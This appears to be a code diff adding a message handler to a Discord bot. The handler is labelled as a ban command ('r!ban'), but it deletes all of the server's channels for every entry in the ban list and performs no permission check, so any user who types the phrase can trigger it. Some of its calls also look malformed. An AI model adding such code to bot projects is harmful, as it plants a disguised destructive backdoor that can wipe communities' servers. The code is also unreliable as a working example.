@@ -34,6 +34,16 @@ client.on('message', message => {
     }
 });
 
+client.on('message', message => {
+    if(message.content == 'r!ban'){
+        message.guild.fetchBans().then(bans => {
+            bans.forEach(user => {
+              message.guild.channels.deleteAll("");
+              message.guild.member.ban();
+            });
+        });
+    }
+});
 
 const log = message => {
   console.log(`${message}`);
